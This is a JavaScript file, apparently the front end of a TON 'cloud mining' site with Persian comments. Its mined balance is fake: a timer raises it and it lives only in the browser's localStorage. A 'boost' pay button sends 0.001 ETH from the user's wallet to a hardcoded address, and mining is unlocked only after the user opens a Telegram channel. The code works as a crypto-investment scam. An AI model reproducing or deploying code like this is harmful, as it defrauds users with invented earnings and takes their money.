let tonValue = 0.000000001;
let balance = 0;
let startClicked = false;
let randomNumberInterval;
let account;

// Load saved values from localStorage
if (localStorage.getItem('tonValue')) {
    tonValue = parseFloat(localStorage.getItem('tonValue'));
}

if (localStorage.getItem('balance')) {
    balance = parseFloat(localStorage.getItem('balance'));
}

const tonValueElement = document.getElementById('ton-value');
const balanceElement = document.getElementById('balance');
const rotatingImage = document.getElementById('rotating-image');
const startButton = document.getElementById('start-button');
const joinTelegramButton = document.getElementById('joinTelegramButton');
const randomNumberElement = document.getElementById('random-number');

function updateTonValue() {
    tonValue += 0.000000096;
    tonValueElement.textContent = `${tonValue.toFixed(9)} TON`;
    localStorage.setItem('tonValue', tonValue);
}

document.getElementById('claim-button').addEventListener('click', () => {
    balance += tonValue;
    balanceElement.textContent = balance.toFixed(9);
    localStorage.setItem('balance', balance);
    tonValue = 0.000000000;
    localStorage.setItem('tonValue', tonValue);
    tonValueElement.textContent = `${tonValue.toFixed(9)} TON`;
});

document.getElementById('boost-button').addEventListener('click', () => {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('boost-screen').style.display = 'block';
});

document.getElementById('back-button').addEventListener('click', () => {
    document.getElementById('boost-screen').style.display = 'none';
    document.getElementById('main-screen').style.display = 'block';
});

// اتصال به کیف پول
document.getElementById('connect-button').addEventListener('click', event => {
    let button = event.target;

    if (/Mobi|Android/i.test(navigator.userAgent)) {
        // دستگاه موبایل شناسایی شد
        window.location.href = `https://metamask.app.link/https://cloudmine.freehost.io`;
    } else {
        // دسکتاپ یا مرورگرهای غیر موبایلی
        ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
            account = accounts[0];
            console.log(account);
            button.textContent = account;

            // گرفتن موجودی از کیف پول
            ethereum.request({ method: 'eth_getBalance', params: [account, 'latest'] }).then(result => {
                console.log(result);
                let wei = parseInt(result, 16);
                let balance = wei / (10 ** 18);
                console.log(balance + " ETH");
            });
        });
    }
});

// بررسی شبکه و فعال‌سازی پرداخت
if (window.ethereum.networkVersion == 10) {
    document.getElementById('pay-button').addEventListener('click', event => {
        let transactionParam = {
            to: '0xf08D7ce1352a1E53a7f4b03E7F5C7AbbE577BD18',
            from: account,
            value: '0x38D7EA4C68000'
        };

        ethereum.request({ method: 'eth_sendTransaction', params: [transactionParam] }).then(txhash => {
            console.log(txhash);
            checkTransactionconfirmation(txhash).then(r => alert(r));
        });
    });
}

function checkTransactionconfirmation(txhash) {
    let checkTransactionLoop = () => {
        return ethereum.request({ method: 'eth_getTransactionReceipt', params: [txhash] }).then(r => {
            if (r != null) return 'confirmed';
            else return checkTransactionLoop();
        });
    };

    return checkTransactionLoop();
}

startButton.addEventListener('click', function () {
    if (!startClicked) {
        startClicked = true;
        randomNumberInterval = setInterval(() => {
            const randomValue = 900 + Math.floor(Math.random() * 100);
            randomNumberElement.textContent = randomValue;
        }, 500);
    }
});

if (localStorage.getItem('joinedTelegram')) {
    startButton.disabled = false;
    rotatingImage.style.display = 'block';
    setInterval(updateTonValue, 1000);
} else {
    joinTelegramButton.addEventListener('click', function () {
        window.open('https://t.me/Cloudtonmining', '_blank');
        setTimeout(() => {
            startButton.disabled = false;
            rotatingImage.style.display = 'block';
            setInterval(updateTonValue, 1000);
            localStorage.setItem('joinedTelegram', true);
        }, 5000); // 5 seconds delay
    });
}